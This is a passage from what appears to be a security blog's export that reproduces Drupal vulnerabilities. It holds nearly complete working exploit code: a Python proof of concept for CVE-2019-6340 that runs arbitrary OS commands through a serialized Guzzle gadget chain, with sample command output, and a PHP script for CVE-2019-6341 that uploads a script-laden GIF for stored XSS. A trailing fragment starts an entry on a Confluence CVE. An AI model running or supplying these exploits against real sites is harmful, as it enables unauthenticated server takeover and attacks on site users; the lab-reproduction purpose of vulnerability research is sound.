PoC</span></span><br><span class="line"><span class="comment">#  by @leonjza</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># References:</span></span><br><span class="line"><span class="comment">#  https://www.drupal.org/sa-core-2019-003</span></span><br><span class="line"><span class="comment">#  https://www.ambionics.io/blog/drupal8-rce</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># [warning] Caching heavily affects reliability of this exploit.</span></span><br><span class="line"><span class="comment"># Nodes are used as they are discovered, but once they are done,</span></span><br><span class="line"><span class="comment"># you will have to wait for cache expiry.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Targeting http://127.0.0.1/...</span></span><br><span class="line"><span class="comment"># [+] Finding a usable node id...</span></span><br><span class="line"><span class="comment"># [x] Node enum found a cached article at: 2, skipping</span></span><br><span class="line"><span class="comment"># [x] Node enum found a cached article at: 3, skipping</span></span><br><span class="line"><span class="comment"># [+] Using node_id 4</span></span><br><span class="line"><span class="comment"># [+] Target appears to be vulnerable!</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span></span><br><span class="line"><span class="comment"># root        49  0.0  0.0   4288   716 pts/0    Ss+  16:38   0:00 sh</span></span><br><span class="line"><span class="comment"># root         1  0.0  1.4 390040 30540 ?        Ss   15:20   0:00 apache2 -DFOREGROUND</span></span><br><span class="line"><span class="comment"># www-data    24  0.1  2.8 395652 57912 ?        S    15:20   0:08 apache2 -DFOREGROUND</span></span><br><span class="line"><span class="comment"># www-data    27  0.1  2.9 396152 61108 ?        S    15:20   0:08 apache2 -DFOREGROUND</span></span><br><span class="line"><span class="comment"># www-data    31  0.0  3.4 406304 70408 ?        S    15:22   0:04 apache2 -DFOREGROUND</span></span><br><span class="line"><span class="comment"># www-data    39  0.0  2.7 398472 56852 ?        S    16:14   0:02 apache2 -DFOREGROUND</span></span><br><span class="line"><span class="comment"># www-data    44  0.2  3.2 402208 66080 ?        S    16:37   0:05 apache2 -DFOREGROUND</span></span><br><span class="line"><span class="comment"># www-data    56  0.0  2.6 397988 55060 ?        S    16:38   0:01 apache2 -DFOREGROUND</span></span><br><span class="line"><span class="comment"># www-data    65  0.0  2.3 394252 48460 ?        S    16:40   0:01 apache2 -DFOREGROUND</span></span><br><span class="line"><span class="comment"># www-data    78  0.0  2.5 400996 51320 ?        S    16:47   0:01 apache2 -DFOREGROUND</span></span><br><span class="line"><span class="comment"># www-data   117  0.0  0.0   4288   712 ?        S    17:20   0:00  \_ sh -c echo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urljoin</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_url</span><span class="params">(*args)</span> -&gt; str:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        Builds a URL</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    f = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> args:</span><br><span class="line">        f = urljoin(f, x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uri_valid</span><span class="params">(x: str)</span> -&gt; bool:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        https://stackoverflow.com/a/38020041</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    result = urlparse(x)</span><br><span class="line">    <span class="keyword">return</span> all([result.scheme, result.netloc, result.path])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_drupal_cache</span><span class="params">(r: requests.Response)</span> -&gt; bool:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        Check if a response had the cache header.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'X-Drupal-Cache'</span> <span class="keyword">in</span> r.headers <span class="keyword">and</span> r.headers[<span class="string">'X-Drupal-Cache'</span>] == <span class="string">'HIT'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_article</span><span class="params">(base: str, f: int = <span class="number">1</span>, l: int = <span class="number">100</span>)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        Find a target article that does not 404 and is not cached</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> f &lt; l:</span><br><span class="line">        u = build_url(base, <span class="string">'/node/'</span>, str(f))</span><br><span class="line">        r = requests.get(u)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> check_drupal_cache(r):</span><br><span class="line">            print(<span class="string">f'[x] Node enum found a cached article at: <span class="subst">&#123;f&#125;</span>, skipping'</span>)</span><br><span class="line">            f += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># found an article?</span></span><br><span class="line">        <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> f</span><br><span class="line">        f += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(base: str, node_id: int)</span> -&gt; bool:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        Check if the target is vulnerable.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">"_links"</span>: &#123;</span><br><span class="line">            <span class="string">"type"</span>: &#123;</span><br><span class="line">                <span class="string">"href"</span>: <span class="string">f"<span class="subst">&#123;urljoin(base, <span class="string">'/rest/type/node/INVALID_VALUE'</span>)&#125;</span>"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"type"</span>: &#123;</span><br><span class="line">            <span class="string">"target_id"</span>: <span class="string">"article"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"title"</span>: &#123;</span><br><span class="line">            <span class="string">"value"</span>: <span class="string">"My Article"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"body"</span>: &#123;</span><br><span class="line">            <span class="string">"value"</span>: <span class="string">""</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u = build_url(base, <span class="string">'/node/'</span>, str(node_id))</span><br><span class="line">    r = requests.get(<span class="string">f'<span class="subst">&#123;u&#125;</span>?_format=hal_json'</span>, json=payload, headers=&#123;<span class="string">"Content-Type"</span>: <span class="string">"application/hal+json"</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> check_drupal_cache(r):</span><br><span class="line">        print(<span class="string">f'Checking if node <span class="subst">&#123;node_id&#125;</span> is vuln returned cache HIT, ignoring'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'INVALID_VALUE does not correspond to an entity on this site'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(base: str, node_id: int, cmd: str)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        Exploit using the Guzzle Gadgets</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># pad a easy search replace output:</span></span><br><span class="line">    cmd = <span class="string">'echo ---- &amp; '</span> + cmd</span><br><span class="line">    payload = &#123;</span><br><span class="line">        <span class="string">"link"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"value"</span>: <span class="string">"link"</span>,</span><br><span class="line">                <span class="string">"options"</span>: <span class="string">"O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:&#123;s:33:\"\u0000"</span></span><br><span class="line">                           <span class="string">"GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:&#123;s:5:\""</span></span><br><span class="line">                           <span class="string">"close\";a:2:&#123;i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:"</span></span><br><span class="line">                           <span class="string">"&#123;s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000handler\";"</span></span><br><span class="line">                           <span class="string">"s:|size|:\"|command|\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000"</span></span><br><span class="line">                           <span class="string">"stack\";a:1:&#123;i:0;a:1:&#123;i:0;s:6:\"system\";&#125;&#125;s:31:\"\u0000"</span></span><br><span class="line">                           <span class="string">"GuzzleHttp\\HandlerStack\u0000cached\";b:0;&#125;i:1;s:7:\""</span></span><br><span class="line">                           <span class="string">"resolve\";&#125;&#125;s:9:\"_fn_close\";a:2:&#123;i:0;r:4;i:1;s:7:\"resolve\";&#125;&#125;"</span></span><br><span class="line">                           <span class="string">""</span>.replace(<span class="string">'|size|'</span>, str(len(cmd))).replace(<span class="string">'|command|'</span>, cmd)</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"_links"</span>: &#123;</span><br><span class="line">            <span class="string">"type"</span>: &#123;</span><br><span class="line">                <span class="string">"href"</span>: <span class="string">f"<span class="subst">&#123;urljoin(base, <span class="string">'/rest/type/shortcut/default'</span>)&#125;</span>"</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    u = build_url(base, <span class="string">'/node/'</span>, str(node_id))</span><br><span class="line">    r = requests.get(<span class="string">f'<span class="subst">&#123;u&#125;</span>?_format=hal_json'</span>, json=payload, headers=&#123;<span class="string">"Content-Type"</span>: <span class="string">"application/hal+json"</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> check_drupal_cache(r):</span><br><span class="line">        print(<span class="string">f'Exploiting <span class="subst">&#123;node_id&#125;</span> returned cache HIT, may have failed'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'----'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">'[warn] Command execution _may_ have failed'</span>)</span><br><span class="line"></span><br><span class="line">    print(r.text.split(<span class="string">'----'</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(base: str, cmd: str)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        Execute an OS command!</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">'[+] Finding a usable node id...'</span>)</span><br><span class="line">    article = find_article(base)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> article:</span><br><span class="line">        print(<span class="string">'[!] Unable to find a node ID to reference. Check manually?'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">f'[+] Using node_id <span class="subst">&#123;article&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line">    vuln = check(base, article)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> vuln:</span><br><span class="line">        print(<span class="string">'[!] Target does not appear to be vulnerable.'</span>)</span><br><span class="line">        print(<span class="string">'[!] It may also simply be a caching issue, so maybe just try again later.'</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    print(<span class="string">f'[+] Target appears to be vulnerable!'</span>)</span><br><span class="line"></span><br><span class="line">    exploit(base, article, cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'CVE-2019-6340 Drupal 8 REST Services Unauthenticated RCE PoC'</span>)</span><br><span class="line">    print(<span class="string">' by @leonjza\n'</span>)</span><br><span class="line">    print(<span class="string">'References:\n'</span></span><br><span class="line">          <span class="string">' https://www.drupal.org/sa-core-2019-003\n'</span></span><br><span class="line">          <span class="string">' https://www.ambionics.io/blog/drupal8-rce\n'</span>)</span><br><span class="line">    print(<span class="string">'[warning] Caching heavily affects reliability of this exploit.\n'</span></span><br><span class="line">          <span class="string">'Nodes are used as they are discovered, but once they are done,\n'</span></span><br><span class="line">          <span class="string">'you will have to wait for cache expiry.\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt;= <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">f'Usage: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> &lt;target base URL&gt; &lt;command&gt;'</span>)</span><br><span class="line">        print(<span class="string">f'    Example: <span class="subst">&#123;sys.argv[<span class="number">0</span>]&#125;</span> http://127.0.0.1/ id'</span>)</span><br><span class="line"></span><br><span class="line">    target = sys.argv[<span class="number">1</span>]</span><br><span class="line">    command = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> uri_valid(target):</span><br><span class="line">        print(<span class="string">f'Target <span class="subst">&#123;target&#125;</span> is not a valid URL'</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">f'Targeting <span class="subst">&#123;target&#125;</span>...'</span>)</span><br><span class="line">    main(target, command)</span><br></pre></td></tr></table></figure><h3 id="CVE-2019-6341-XSS"><a href="#CVE-2019-6341-XSS" class="headerlink" title="CVE-2019-6341 XSS"></a>CVE-2019-6341 XSS</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>php blog-poc.php 192.168.116.132 8080</p><figure class="highlight php"><figcaption><span>blog-poc.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">usage: php poc.php &lt;target-ip&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Date: 1 March 2019</span></span><br><span class="line"><span class="comment">Exploit Author: TrendyTofu</span></span><br><span class="line"><span class="comment">Original Discoverer: Sam Thomas</span></span><br><span class="line"><span class="comment">Version: &lt;= Drupal 8.6.2</span></span><br><span class="line"><span class="comment">Tested on: Drupal 8.6.2 Ubuntu 18.04 LTS x64 with ext4.</span></span><br><span class="line"><span class="comment">Tested not wokring on: Drupal running on MacOS with APFS</span></span><br><span class="line"><span class="comment">CVE : CVE-2019-6341</span></span><br><span class="line"><span class="comment">Reference: https://www.zerodayinitiative.com/advisories/ZDI-19-291/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$host = $argv[<span class="number">1</span>];</span><br><span class="line">$port = <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">$pk =   <span class="string">"GET /user/register HTTP/1.1\r\n"</span>.</span><br><span class="line"><span class="string">"Host: "</span>.$host.<span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"</span>.</span><br><span class="line"><span class="string">"Accept-Language: en-US,en;q=0.5\r\n"</span>.</span><br><span class="line"><span class="string">"Referer: http://"</span>.$host.<span class="string">"/user/login\r\n"</span>.</span><br><span class="line"><span class="string">"Connection: close\r\n\r\n"</span>;</span><br><span class="line"></span><br><span class="line">$fp = fsockopen($host,$port,$e,$err,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;<span class="keyword">die</span>(<span class="string">"not connected"</span>);&#125;</span><br><span class="line">fputs($fp,$pk);</span><br><span class="line">$out=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof($fp))&#123;</span><br><span class="line">  $out.=fread($fp,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">'/name="form_build_id" value="(.*)"/'</span>, $out, $match);</span><br><span class="line">$formid = $match[<span class="number">1</span>];</span><br><span class="line"><span class="comment">//var_dump($formid);</span></span><br><span class="line"><span class="comment">//echo "form id is:". $formid;</span></span><br><span class="line"><span class="comment">//echo $out."\n";</span></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">$data = </span><br><span class="line"><span class="string">"Content-Type: multipart/form-data; boundary=---------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Connection: close\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"mail\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"test324@example.com\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"name\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"test2345\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"files[user_picture_0]\"; filename=\"xxx\xc0.gif\"\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Type: image/gif\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"GIF\r\n"</span>.</span><br><span class="line"><span class="string">"&lt;HTML&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"&lt;HEAD&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"&lt;SCRIPT&gt;alert(123);&lt;/SCRIPT&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"&lt;/HEAD&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"&lt;BODY&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"&lt;/BODY&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"&lt;/HTML&gt;\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"user_picture[0][fids]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"user_picture[0][display]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"1\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"form_build_id\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="comment">//"form-KyXRvDVovOBjofviDPTw682MQ8Bf5es0PyF-AA2Buuk\r\n".</span></span><br><span class="line">$formid.<span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"form_id\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"user_register_form\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"contact\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"1\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"timezone\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"America/New_York\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"_triggering_element_name\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"user_picture_0_upload_button\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"_triggering_element_value\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"Upload\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"_drupal_ajax\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"1\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"ajax_page_state[theme]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"bartik\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"ajax_page_state[theme_token]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Disposition: form-data; name=\"ajax_page_state[libraries]\"\r\n"</span>.</span><br><span class="line"><span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"bartik/global-styling,classy/base,classy/messages,core/drupal.ajax,core/drupal.collapse,core/drupal.timezone,core/html5shiv,core/jquery.form,core/normalize,file/drupal.file,system/base\r\n"</span>.</span><br><span class="line"><span class="string">"-----------------------------60928216114129559951791388325--\r\n"</span>;</span><br><span class="line"></span><br><span class="line">$pk = <span class="string">"POST /user/register?element_parents=user_picture/widget/0&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1\r\n"</span>.</span><br><span class="line"><span class="string">"Host: "</span>.$host.<span class="string">"\r\n"</span>.</span><br><span class="line"><span class="string">"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"</span>.</span><br><span class="line"><span class="string">"Accept: application/json, text/javascript, */*; q=0.01\r\n"</span>.</span><br><span class="line"><span class="string">"Accept-Language: en-US,en;q=0.5\r\n"</span>.</span><br><span class="line"><span class="string">"X-Requested-With: XMLHttpRequest\r\n"</span>.</span><br><span class="line"><span class="string">"Referer: http://"</span> .$host. <span class="string">"/user/register\r\n"</span>.</span><br><span class="line"><span class="string">"Content-Length: "</span>. strlen($data). <span class="string">"\r\n"</span>.</span><br><span class="line">$data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"uploading file, please wait...\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i =<span class="number">1</span>; $i &lt;= <span class="number">2</span>; $i++)&#123;</span><br><span class="line">$fp = fsockopen($host,$port,$e,$err,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;<span class="keyword">die</span>(<span class="string">"not connected"</span>);&#125;</span><br><span class="line">fputs($fp,$pk);</span><br><span class="line">$out=<span class="string">""</span>;</span><br><span class="line"><span class="keyword">while</span> (!feof($fp))&#123;</span><br><span class="line">  $out.=fread($fp,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Got "</span>.$i.<span class="string">"/2 500 errors\n"</span>;</span><br><span class="line"><span class="comment">//echo $out."\n";</span></span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please check /var/www/html/drupal/sites/default/files/pictures/YYYY-MM\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20201130185053451.png" alt="image-20201130185053451"></p><p><img src="/imgs/image-20201130185600912.png" alt="image-20201130185600912"></p>]]></content>
      
      
      <categories>
          
          <category> Drupal </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Drupal </tag>
            
            <tag> CVE-2014-3704 </tag>
            
            <tag> CVE-2017-6920 </tag>
            
            <tag> CVE-2018-7600 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Confluence CVE-2019-3396路径穿越&amp;RCE漏洞复现</title>
      <link href="2020/11/23/Confluence-CVE-2019-3396%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/11/23/Confluence-CVE-2019-3396%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
